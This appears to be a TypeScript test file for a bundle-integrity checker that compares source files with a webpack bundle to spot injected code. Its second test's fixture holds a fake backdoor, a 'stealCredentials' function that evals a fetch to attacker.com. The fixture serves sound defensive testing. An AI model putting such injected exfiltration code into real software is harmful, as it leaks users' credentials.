import test from 'node:test';
import assert from 'node:assert/strict';
import { OcteractSourceToBundleAttribution } from '../src/rea/sourceToBundle.ts';

test('OcteractSourceToBundleAttribution: verifies clean deterministic compilation', () => {
  const sourceMap = {
    'src/auth.ts': `
      export class AuthService {
        public login() { return true; }
      }
    `,
    'src/config.ts': `
      export const API_URL = "https://api.example.com";
    `,
  };

  const cleanBundle = `
    (function(modules) {
      // webpack wrapper
    })({
      "src/auth.ts": (function(module, exports) {
        class AuthService {
          login() { return true; }
        }
        exports.AuthService = AuthService;
      }),
      "src/config.ts": (function(module, exports) {
        exports.API_URL = "https://api.example.com";
      })
    });
  `;

  const report = OcteractSourceToBundleAttribution.compare(sourceMap, cleanBundle, 'dist.js');

  assert.equal(report.verdict, 'CRYPTO_VERIFIED_CLEAN');
  assert.ok(report.integrityScore >= 90);
  assert.equal(report.phantomAnomalies.length, 0);
  assert.equal(report.summary.exactMatches, 2);
  assert.equal(report.summary.ghostInjections, 0);
});

test('OcteractSourceToBundleAttribution: detects phantom ghost code injection in bundle', () => {
  const sourceMap = {
    'src/math.ts': `
      export function add(a: number, b: number): number {
        return a + b;
      }
    `,
  };

  // Malicious bundle has injected backdoors that were never in src/math.ts
  const tamperedBundle = `
    (function(modules) {
    })({
      "src/math.ts": (function(module, exports) {
        exports.add = function(a, b) { return a + b; };
      }),
      "src/injected_backdoor.ts": (function(module, exports) {
        exports.stealCredentials = function() {
          return eval("fetch('http://attacker.com/leak')");
        };
      })
    });
  `;

  const report = OcteractSourceToBundleAttribution.compare(sourceMap, tamperedBundle, 'compromised.js');

  assert.equal(report.verdict, 'SUSPECTED_TAMPERING');
  assert.ok(report.phantomAnomalies.length > 0);
  assert.ok(
    report.phantomAnomalies.some(
      (a) => a.type === 'GHOST_CODE_INJECTION' || a.type === 'DYNAMIC_EVAL_IN_BUNDLE'
    )
  );
  assert.ok(report.integrityScore < 70);
});
